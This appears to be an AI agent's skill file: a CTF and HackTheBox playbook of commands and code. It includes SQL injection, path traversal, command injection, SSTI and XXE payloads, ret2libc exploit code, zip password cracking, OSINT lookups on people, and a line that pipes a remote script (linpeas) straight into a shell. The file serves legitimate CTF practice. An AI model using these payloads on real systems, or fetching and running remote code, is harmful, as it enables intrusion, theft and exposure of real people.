---
name: ctf
description: Use when working on CTF (Capture the Flag) challenges, HackTheBox machines, TryHackMe rooms, pwn challenges, reverse engineering, cryptography puzzles, forensics, web exploitation CTF tasks, OSINT challenges, or steganography. Also use when the user says "CTF", "HackTheBox", "HTB", "TryHackMe", "THM", "pwn this", "reverse this binary", "solve this crypto", or "find the flag".
---

# CTF Challenge Playbook

## Philosophy
CTF = time-limited puzzle solving. Speed + methodology beats random exploration.
Always read challenge description twice - the hint is usually there.
Try the obvious first: base64, ROT13, strings, default creds, common exploits.
Never brute force blindly - enumerate first, understand the intended path.

## Arguments
`<challenge>` - challenge name or description
`<category>` - WEB / CRYPTO / PWN / RE / FORENSICS / OSINT / STEGO / MISC / FULL

---

## Phase 1 - Triage & First Look (ALL Categories)

```bash
# Universal first steps for any CTF challenge:

# 1. Read everything in the challenge description
# Author usually hints at the vulnerability or technique needed

# 2. File identification
file challenge.*
xxd challenge | head -20      # hex dump first 20 lines
strings challenge | head -50   # printable strings
binwalk challenge             # embedded files/archives

# 3. grep for flag format immediately
strings challenge | grep -i "CTF{\|FLAG{\|HTB{\|picoCTF{\|flag{"
grep -r "CTF{\|FLAG{\|HTB{" ./ 2>/dev/null

# 4. Check for metadata
exiftool challenge.*
steghide info challenge.jpg 2>/dev/null

# 5. Common quick wins (try before deeper analysis):
base64 -d <<< "<suspected_b64>"
echo "<hex>" | xxd -r -p
echo "<rot13>" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

---

## Phase 2 - Web Exploitation (CTF Edition)

```bash
# Web CTF quick checklist:
# 1. View page source (Ctrl+U) - look for comments, hidden fields, flag in HTML
# 2. Check robots.txt, sitemap.xml, .git/ exposure
# 3. Check cookies (base64? JWT? pickle serialization?)
# 4. Check HTTP headers (X-Flag, X-Debug, etc.)

# CTF-specific web vulnerabilities:

## SQL Injection (single-quote test):
curl "https://<target>/login?user=admin'--&pass=x"
# Union-based (if error-based):
curl "https://<target>/search?q=1' UNION SELECT 1,2,3--"
# Blind (if no output):
curl "https://<target>/search?q=1' AND SLEEP(5)--"

## LFI/Path Traversal (extremely common in CTFs):
curl "https://<target>/page?file=../../../../etc/passwd"
curl "https://<target>/page?file=....//....//etc/passwd"
curl "https://<target>/page?file=php://filter/convert.base64-encode/resource=/etc/flag"
curl "https://<target>/page?file=php://filter/read=string.rot13/resource=/etc/flag"

## Command Injection:
curl "https://<target>/ping?host=127.0.0.1;cat /flag"
curl "https://<target>/exec?cmd=id"
curl "https://<target>/ping?host=127.0.0.1%60cat+/flag%60"

## SSTI (Server-Side Template Injection):
# Test: {{7*7}}, ${7*7}, #{7*7}, *{7*7}
curl "https://<target>/greet?name={{7*7}}"
# Jinja2 RCE: {{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}

## JWT attacks (decode -> modify -> resign):
python3 -c "
import base64, json
tok = '<jwt>'
h = json.loads(base64.urlsafe_b64decode(tok.split('.')[0] + '=='))
p = json.loads(base64.urlsafe_b64decode(tok.split('.')[1] + '=='))
print('Header:', json.dumps(h, indent=2))
print('Payload:', json.dumps(p, indent=2))
"
# Try alg:none (remove signature), alg confusion (RS256->HS256)

## SSRF:
curl "https://<target>/fetch?url=http://localhost:8080/flag"
curl "https://<target>/fetch?url=file:///etc/flag"

## XXE (XML processing):
curl -X POST "https://<target>/parse" -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY f SYSTEM "file:///flag">]><x>&f;</x>'
```

---

## Phase 3 - Cryptography

```python
# CTF crypto: identify cipher first, then solve

## Identify:
# Repeating chars, modular patterns -> substitution/Vigenere
# Only uppercase + numbers -> Base32, Bacon, Morse
# 0/1 sequences -> Binary
# Large numbers -> RSA, DH
# Hex strings -> hex decode
# = padding at end -> base64
# Consistent length chunks -> block cipher

## Quick decoders:
import base64, codecs, binascii

data = "your_encoded_data"
print("b64:", base64.b64decode(data + "==").decode(errors='replace'))
print("hex:", bytes.fromhex(data).decode(errors='replace'))
print("rot13:", codecs.decode(data, 'rot-13'))
print("morse:", data.replace(".", "").replace("-", ""))  # if morse

## RSA small e attacks:
# If e=3 and ciphertext c = m^3 mod n, try c^(1/3) directly (no mod needed if m is small)
from gmpy2 import iroot
c = int("<ciphertext>", 16)
m, exact = iroot(c, 3)  # cube root
if exact:
    print(bytes.fromhex(hex(m)[2:]).decode())

## RSA common modulus attack (same n, different e):
from sympy import gcd
from Crypto.Util.number import inverse
n = <n>
e1, e2 = <e1>, <e2>
c1, c2 = <c1>, <c2>
# Extended Euclidean: find a,b such that a*e1 + b*e2 = 1
def egcd(a, b):
    if a == 0: return b, 0, 1
    g, x, y = egcd(b % a, a)
    return g, y - (b // a) * x, x
_, a, b = egcd(e1, e2)
m = (pow(c1, a, n) * pow(c2, b, n)) % n
print(bytes.fromhex(hex(m)[2:]).decode())

## Vigenere cipher (if you know key length via index of coincidence):
def vigenere_decrypt(ct, key):
    ct = ct.upper(); key = key.upper()
    return ''.join(chr((ord(c) - ord(k) % 26 + 26) % 26 + ord('A'))
                   for c, k in zip(ct, (key * 100)[:len(ct)]))
print(vigenere_decrypt("CIPHER", "KEY"))

## XOR with single byte:
for key in range(256):
    pt = bytes([b ^ key for b in bytes.fromhex("<hex>")])
    if all(c in b' abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}!_' for c in pt):
        print(f"Key {key}: {pt}")
```

---

## Phase 4 - Binary Exploitation (PWN)

```bash
# PWN quick start:

# 1. File info
checksec ./binary   # what protections are enabled?
# NX=off: shellcode on stack works
# PIE=off: fixed addresses, no ASLR needed
# RELRO=partial: GOT overwrite possible
# Stack Canary: need info leak first

# 2. Run and observe:
./binary          # normal input
./binary <<< "$(python3 -c "print('A'*200)")"  # overflow?
strace ./binary   # system calls
ltrace ./binary   # library calls

# 3. Find offset to return address (pattern):
python3 -c "
from pwn import *
p = process('./binary')
p.sendline(cyclic(200))
p.wait()
core = p.corefile
print('Offset:', cyclic_find(core.rsp))  # or core.eip for 32-bit
"

# 4. ret2libc (NX enabled, no ASLR or leaked libc base):
python3 -c "
from pwn import *
elf = ELF('./binary')
libc = ELF('./libc.so.6')
rop = ROP(elf)

# Find gadgets:
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

# Leak libc base via puts(puts_got):
payload = flat({64: [pop_rdi, elf.got['puts'], elf.plt['puts'], elf.sym['main']]})
p = process('./binary')
p.sendline(payload)
puts_addr = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = puts_addr - libc.sym['puts']
print(hex(libc.address))
"

# 5. Format string exploit (if %x or %n works):
# Find offset: ./binary <<< "AAAA%1\$p %2\$p %3\$p ..." -> when does 0x41414141 appear?
# Arbitrary write: %<value>c%<offset>\$n

# 6. Heap exploitation (use-after-free, double-free):
# pwndbg: heap, bins, chunks commands after malloc/free
# tcache poisoning (glibc < 2.34): double free -> control fd ptr -> malloc to target addr
```

---

## Phase 5 - Reverse Engineering

```bash
# RE toolkit:

# Static analysis:
file binary
strings binary | grep -i "flag\|CTF\|pass\|key\|secret"
objdump -d binary | head -100
readelf -a binary | head -50

# Decompiler (ghidra / radare2 / ida):
# Ghidra CLI:
analyzeHeadless /tmp/ghidra_project MyProject -import ./binary -postScript PrintTrees.java -scriptPath /opt/ghidra/support
# Interactive: open Ghidra GUI -> CodeBrowser -> Functions panel -> main()

# Dynamic analysis:
gdb ./binary
# pwndbg: run, break *main, nexti, info registers, x/20xg $rsp

# ltrace/strace to find hidden comparisons:
ltrace ./binary 2>&1 | grep -i "strcmp\|strncmp\|memcmp"
strace -e trace=all ./binary 2>&1

# Common RE patterns in CTFs:
# strcmp(input, "secret") -> input must equal "secret"
# XOR loop: key ^ each_char -> reverse by XOR-ing with same key
# CRC32/MD5 comparison -> crack offline
# Anti-debug: ptrace check -> NOP it out in hex editor or with GDB

# Python pwntools for automated:
python3 -c "
from pwn import *
context.arch = 'amd64'
elf = ELF('./binary')
# Find all strings:
for addr, s in elf.strings.items():
    if b'flag' in s.lower() or b'CTF' in s: print(hex(addr), s)
"

# Angr (symbolic execution - solves complex key checks automatically):
python3 -c "
import angr
proj = angr.Project('./binary', auto_load_libs=False)
state = proj.factory.entry_state(stdin=angr.SimFile())
simgr = proj.factory.simulation_manager(state)
simgr.explore(find=0x<success_addr>, avoid=0x<fail_addr>)
if simgr.found:
    print(simgr.found[0].posix.dumps(0))
"
```

---

## Phase 6 - Forensics & Steganography

```bash
# FORENSICS:

# Image forensics:
exiftool image.jpg | grep -i "comment\|description\|author\|flag"
steghide extract -sf image.jpg -p ""          # empty password
steghide extract -sf image.jpg -p "password"
zsteg image.png                               # LSB stego in PNG
binwalk -e image.jpg                          # embedded files
foremost image.jpg                            # file carving

# Audio forensics:
sox audio.wav -n stat                         # audio statistics
# Open in Audacity -> spectrogram view (flag often visible)
ffmpeg -i audio.mp3 -f wav /tmp/out.wav
python3 -c "
import scipy.io.wavfile as wav
import numpy as np
rate, data = wav.read('/tmp/out.wav')
print(data[:100])  # look for patterns
"

# Network capture (PCAP):
wireshark challenge.pcap &
# Or tshark:
tshark -r challenge.pcap -Y "http" -T fields -e http.request.uri -e http.file_data 2>/dev/null
tshark -r challenge.pcap -Y "ftp" -T fields -e ftp.request.command -e ftp.request.arg 2>/dev/null
# Extract all HTTP objects:
tshark -r challenge.pcap --export-objects http,/tmp/http_objects/
# DNS exfiltration (flag encoded in DNS queries):
tshark -r challenge.pcap -Y "dns.qry.type == 1" -T fields -e dns.qry.name 2>/dev/null

# Memory forensics:
volatility -f memory.dmp imageinfo                  # identify OS
volatility -f memory.dmp --profile=<profile> pslist # running processes
volatility -f memory.dmp --profile=<profile> cmdline
volatility -f memory.dmp --profile=<profile> filescan | grep -i "flag\|secret"
volatility -f memory.dmp --profile=<profile> dumpfiles -Q <offset> -D /tmp/

# ZIP password cracking:
fcrackzip -u -D -p /opt/wordlists/rockyou.txt challenge.zip
john --format=zip challenge.zip.hash /opt/wordlists/rockyou.txt

# PDF analysis:
pdfid challenge.pdf
pdf-parser challenge.pdf | grep -i "stream\|filter\|flag"
qpdf --qdf challenge.pdf /tmp/out.pdf  # decompress streams

# STEGO quick wins:
# ASCII art -> convert to text
# Whitespace stego: stegsnow -C output.txt
# Morse code in whitespace: tabs=dash, spaces=dot
```

---

## Phase 7 - OSINT

```bash
# Username search across platforms:
sherlock <username>
whatsmyname <username>

# Image reverse search:
# Upload to: Google Images, TinEye, Yandex Images

# Domain OSINT:
whois <domain>
dig <domain> ANY
theharvester -d <domain> -b all

# Email address OSINT:
hunter.io (manual) -> format + sources
holehe <email>    # check which sites account is registered on
# breach data: haveibeenpwned.com

# Metadata extraction from documents:
exiftool document.pdf | grep -i "author\|creator\|company\|last.*saved"
# Author name -> LinkedIn -> location -> flag

# Social media deep search:
# Twitter/X: site:twitter.com "<username>" 
# LinkedIn: site:linkedin.com "<name>" "<company>"
# GitHub: site:github.com "<username>" -> repos -> commits -> email

# Google dorks for CTF targets:
site:<target> filetype:pdf
site:<target> inurl:admin
site:<target> intitle:"index of"
"<target>" "flag" site:pastebin.com
```

---

## Phase 8 - HackTheBox / TryHackMe Machine Methodology

```bash
# Standard HTB/THM methodology:

# 1. Nmap scan:
sudo nmap -sV -sC -O -p- <IP> -oA initial
# Quick scan first:
sudo nmap -sV --top-ports 1000 <IP> -T4

# 2. Web enum (port 80/443/8080):
gobuster dir -u http://<IP> -w /opt/wordlists/dirb/common.txt -x php,txt,html,bak
nikto -h http://<IP>
whatweb http://<IP>

# 3. SMB (port 445):
smbclient -L //<IP>/ -N
crackmapexec smb <IP> --shares
smbmap -H <IP>
# Download everything readable:
smbclient //<IP>/share -N -c "recurse; prompt; mget *"

# 4. FTP (port 21):
ftp <IP>  # try anonymous:anonymous
# Or: lftp ftp://anonymous@<IP>

# 5. SSH (port 22):
ssh-audit <IP>  # check weak algos
# If you have credentials: ssh user@<IP>

# 6. Privilege escalation (once you have a shell):
# Linux:
sudo -l                              # sudo rights?
find / -perm -4000 2>/dev/null       # SUID binaries
cat /etc/crontab                     # cron jobs
ps aux                               # running processes
env                                  # environment variables
cat /etc/passwd | grep -v nologin    # users
# Automated: curl -s http://linpeas.sh | sh  (or upload and run)

# Windows:
whoami /all
net user; net localgroup administrators
systeminfo | findstr /i "os name\|os version\|hotfix"
wmic process list brief
# PowerShell:
Get-LocalUser; Get-LocalGroup
# winPEAS: upload and run for full enumeration

# 7. Flag locations:
# Linux user flag: /home/<user>/user.txt
# Linux root flag: /root/root.txt
# Windows: C:\Users\<user>\Desktop\user.txt, C:\Users\Administrator\Desktop\root.txt
find / -name "*.txt" -readable 2>/dev/null | grep -i "flag\|user\|root"
```

---

## Quick Reference - Common CTF Tools

```
WEB:         burpsuite, sqlmap, ffuf, gobuster, nikto, wfuzz
CRYPTO:      cyberchef (online), pycryptodome, gmpy2, hashcat, john
PWN:         pwntools, gdb-pwndbg, ghidra, radare2, angr, ROPgadget
RE:          ghidra, ida-free, radare2, ltrace, strace, strings
FORENSICS:   volatility, wireshark, tshark, binwalk, foremost, exiftool
STEGO:       steghide, zsteg, stegsolve, audacity, sonic-visualizer
OSINT:       sherlock, theHarvester, holehe, recon-ng
HTB/THM:     linpeas, winpeas, metasploit, nmap, netcat, socat
```

---

## Output

Write flag and solve path to `~/pentest-toolkit/results/<challenge>/ctf_solve.md`:

```markdown
# CTF Solve: <challenge name>
Category: <WEB/CRYPTO/PWN/RE/FORENSICS/OSINT/STEGO>
Platform: HTB / THM / CTFtime

## Flag
CTF{...}

## Vulnerability / Technique
<one-line description of the vulnerability or technique used>

## Solve Path
1. <step 1 - what you tried/found>
2. <step 2>
3. <step 3 - flag found here>

## Key Command
<the single most important command that got the flag>

## Lessons Learned
<what made this non-obvious / what to look for next time>
```

Tell user: "CTF solved! Flag: <FLAG VALUE>. Solve written to `ctf_solve.md`."
